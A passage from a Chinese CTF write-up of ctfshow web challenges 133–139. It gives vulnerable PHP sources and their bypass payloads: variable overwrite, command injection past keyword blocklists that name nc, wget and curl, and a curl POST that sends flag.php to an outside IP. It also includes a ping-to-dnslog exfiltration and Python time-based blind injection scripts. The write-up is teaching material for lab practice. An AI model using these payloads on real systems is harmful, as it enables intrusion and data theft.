</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-13 16:43:44
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">//flag.php
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nv">$F</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;F&#39;</span><span class="p">]){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/system|nc|wget|exec|passthru|netcat/i&#39;</span><span class="p">,</span> <span class="nv">$F</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$F</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;6个字母都还不够呀?!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><a href="https://www.cnblogs.com/hithub/p/16809053.html">ctfshow web133(变量覆盖+无回显命令执行dns_bp带外) - hithub - 博客园</a></p>
<p>这其实是一道关于变量覆盖的题目</p>
<pre tabindex="0"><code>get传参   F=`$F `;sleep 3
经过substr($F,0,6)截取后 得到  `$F `;
也就是会执行 eval(&#34;`$F `;&#34;);
我们把原来的$F带进去
eval(&#34;``$F `;sleep 3`&#34;);
也就是说最终会执行  `   `$F `;sleep 3  ` == shell_exec(&#34;`$F `;sleep 3&#34;);
前面的命令我们不需要管，但是后面的命令我们可以自由控制。
这样就在服务器上成功执行了 sleep 3
所以 最后就是一道无回显的RCE题目了
</code></pre><p>payload:</p>
<pre tabindex="0"><code>`$F `;cat flag.php | curl -X POST -d @- http://106.55.168.231:7777/
</code></pre><p>curl外带rce</p>
<p><img alt="image-20250124143152342" loading="lazy" src="assets/image-20250124143152342.png"></p>
<h4 id="web134">web134<a hidden class="anchor" aria-hidden="true" href="#web134">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-14 23:01:06
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nv">$key1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nv">$key2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key1&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;key2&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;key1&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;key2&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;nonononono&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="o">@</span><span class="nx">parse_str</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nx">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$key1</span> <span class="o">==</span> <span class="s1">&#39;36d&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$key2</span> <span class="o">==</span> <span class="s1">&#39;36d&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><img alt="image-20250124144438661" loading="lazy" src="assets/image-20250124144438661.png"></p>
<p>看到extract想起变量覆盖</p>
<pre tabindex="0"><code>extract($_POST);
//提取$_POST数组
</code></pre><p>payload:</p>
<pre tabindex="0"><code>?_POST[key1]=36d&amp;_POST[key2]=36d
</code></pre><h4 id="web135">web135<a hidden class="anchor" aria-hidden="true" href="#web135">#</a></h4>
<pre tabindex="0"><code>&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-10-13 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-16 18:48:03

*/

error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET[&#39;F&#39;]){
    if(!preg_match(&#39;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#39;, $F)){
        eval(substr($F,0,6));
    }else{
        die(&#34;师傅们居然破解了前面的，那就来一个加强版吧&#34;);
    }
}
</code></pre><p>133plus</p>
<p>这题ban了很多命令</p>
<p>但是没ban nl,mv，可以用nl和cp把flag写到其他文件中</p>
<p>payload:</p>
<pre tabindex="0"><code>`$F `;nl f*&gt;1.txt
`$F `;mv f*&gt;1.txt
</code></pre><p><img alt="image-20250124150917001" loading="lazy" src="assets/image-20250124150917001.png"></p>
<p>这题也可以用ping进行外带</p>
<pre tabindex="0"><code>`$F`;+ping `cat flag.php|awk &#39;NR==2&#39;`.6x1sys.dnslog.cn
#通过ping命令去带出数据，然后awk NR一排一排的获得数据
</code></pre><h4 id="web136">web136<a hidden class="anchor" aria-hidden="true" href="#web136">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="k">function</span> <span class="nf">check</span><span class="p">(</span><span class="nv">$x</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\{|\}|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#39;</span><span class="p">,</span> <span class="nv">$x</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;too young too simple sometimes naive!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nx">check</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nx">exec</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这题要用到一个linux的命令tee</p>
<blockquote>
<h3 id="linux-tee命令介绍">Linux <a href="https://so.csdn.net/so/search?q=tee&amp;spm=1001.2101.3001.7020">tee</a>命令介绍<a hidden class="anchor" aria-hidden="true" href="#linux-tee命令介绍">#</a></h3>
<p><code>tee</code>命令在Linux中用于从标准输入读取数据，并将其写入到标准输出和一个或多个文件中。<code>tee</code>命令通常与其他命令一起通过管道使用。</p>
<p>如</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">ls /<span class="p">|</span>tee 1.txt
</span></span></code></pre></div><p>就可以将ls /的结果写入到1.txt文件中</p></blockquote>
<pre tabindex="0"><code>ls /|tee 1
</code></pre><p>这题ban掉了.</p>
<p>访问url/1，下载文件1</p>
<p><img alt="image-20250124152140227" loading="lazy" src="assets/image-20250124152140227.png"></p>
<p>看到flag的位置</p>
<pre tabindex="0"><code>?c=cat /f149_15_h3r3|tee 2
</code></pre><p><img alt="image-20250124152240505" loading="lazy" src="assets/image-20250124152240505.png"></p>
<h4 id="web137">web137<a hidden class="anchor" aria-hidden="true" href="#web137">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-16 22:27:49
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">class</span> <span class="nc">ctfshow</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;private class&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">static</span> <span class="k">function</span> <span class="nf">getFlag</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">]);</span>
</span></span></code></pre></div><p><img alt="image-20250124162118373" loading="lazy" src="assets/image-20250124162118373.png"></p>
<p>我们需要通过post传入一个数组，数组中包含类名和方法名</p>
<p>payload</p>
<pre tabindex="0"><code>ctfshow[]=ctfshow&amp;ctfshow[]=getFlag
</code></pre><p>又或者</p>
<pre tabindex="0"><code>ctfshow=ctfshow::getFlag
</code></pre><h4 id="web138">web138<a hidden class="anchor" aria-hidden="true" href="#web138">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-16 22:52:13
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">class</span> <span class="nc">ctfshow</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;private class&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">static</span> <span class="k">function</span> <span class="nf">getFlag</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">strripos</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">],</span> <span class="s2">&#34;:&#34;</span><span class="p">)</span><span class="o">&gt;-</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;private function&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">]);</span>
</span></span></code></pre></div><p>这道题限制了上一题的第二种解法</p>
<p>第一种还能继续使用</p>
<p>payload:</p>
<pre tabindex="0"><code>ctfshow[]=ctfshow&amp;ctfshow[]=getFlag
ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag
</code></pre><h4 id="web139">web139<a hidden class="anchor" aria-hidden="true" href="#web139">#</a></h4>
<pre tabindex="0"><code>&lt;?php
error_reporting(0);
function check($x){
    if(preg_match(&#39;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\{|\}|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#39;, $x)){
        die(&#39;too young too simple sometimes naive!&#39;);
    }
}
if(isset($_GET[&#39;c&#39;])){
    $c=$_GET[&#39;c&#39;];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?&gt;
</code></pre><p>这题看着和前面那题是一样的</p>
<p>但实际上没有写文件的权限</p>
<p>这题可以通过时间盲注攻击获取文件名已经文件中的字符等</p>
<p>时间盲注脚本：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nb">str</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s2">&#34;-&#34;</span> <span class="o">+</span> <span class="s2">&#34;{&#34;</span> <span class="o">+</span> <span class="s2">&#34;}&#34;</span> <span class="o">+</span> <span class="s2">&#34;_&#34;</span> <span class="o">+</span> <span class="s2">&#34;~&#34;</span>    <span class="c1"># 构建一个包含所有字母和数字以及部分符号的字符串，符号可以自己加</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>          <span class="c1"># 初始化一个空字符串，用于保存结果</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="c1">#获取多少行</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">99</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span>   <span class="c1">#用于控制内层循环(j)的结束</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="c1">#不break的情况下，一行最多几个字符</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">99</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="k">if</span> <span class="n">key</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">:</span>       <span class="c1">#n就是一个一个的返回值</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;if [ `ls /|awk &#39;NR==</span><span class="si">{0}</span><span class="s2">&#39;|cut -c </span><span class="si">{1}</span><span class="s2">` == </span><span class="si">{2}</span><span class="s2"> ];then sleep 3;fi&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>   <span class="c1">#{n}是占位符</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">            <span class="c1">#print(payload)</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://89e3e82d-d133-4a9e-a883-790d41e8a3b8.challenge.ctf.show?c=&#34;</span> <span class="o">+</span> <span class="n">payload</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">                <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="p">(</span><span class="mf">2.5</span><span class="p">,</span> <span class="mf">2.5</span><span class="p">))</span>   <span class="c1">#设置超时时间为 2.5 秒,包括连接超时和读取超时，超时就是之前sleep 3了。</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="c1"># 如果请求发生异常，表示条件满足，将当前字符 n 添加到结果字符串中，并结束当前内层循环</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">                <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">+</span> <span class="n">n</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="k">if</span> <span class="n">n</span> <span class="o">==</span> <span class="s1">&#39;~&#39;</span><span class="p">:</span>    <span class="c1">#str的最后一位，“~”不常出现，用作结尾</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">                <span class="n">key</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">                
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="c1"># 在每次获取一个字符后，将一个空格添加到结果字符串中，用于分隔结果的不同位置</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="s2">&#34; &#34;</span>
</span></span></code></pre></div><p>这个脚本的原理其实就是，通过shell编程中的if语句判断</p>
<pre tabindex="0"><code>ls /|awk &#39;NR=={0}&#39;|cut -c {1}
</code></pre><p>中截取到的字符串是否与我们遍历的任一个字符匹配，若匹配成功则使用sleep命令使响应时间变为3s</p>
<p>而脚本通过判断响应时间即可知道截取到的字符是否匹配，从而一个一个字符的获取</p>
<p><img alt="image-20250124171223602" loading="lazy" src="assets/image-20250124171223602.png"></p>
<p>读到flag的位置，接下来就是读文件了，原理一样</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nb">str</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="o">+</span><span class="s2">&#34;-&#34;</span><span class="o">+</span><span class="s2">&#34;{&#34;</span><span class="o">+</span><span class="s2">&#34;}&#34;</span>    
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>          
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">99</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span>   
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">99</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="k">if</span> <span class="n">key</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">:</span>      
</span></span><span class="line"><span class="ln">14</span><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;if [ `cat /f149_15_h3r3|awk &#39;NR==</span><span class="si">{0}</span><span class="s2">&#39;|cut -c </span><span class="si">{1}</span><span class="s2">` == </span><span class="si">{2}</span><span class="s2"> ];then sleep 3;fi&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>   
</span></span><span class="line"><span class="ln">15</span><span class="cl">            <span class="c1">#print(payload)</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">            <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://a37f8386-b265-4794-b4d1-7e4e62f05859.challenge.ctf.show//?c=&#34;</span> <span class="o">+</span> <span class="n">payload</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">                <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="p">(</span><span class="mf">2.5</span><span class="p">,</span> <span class="mf">2.5</span><span class="p">))</span>   
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl">			<span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">                <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">+</span> <span class="n">n</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">                
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="s2">&#34; &#34;</span>
</span></span></code></pre></div><p><img alt="image-20250124180128116" loading="lazy" src="assets/image-20250124180128116.png"></p>
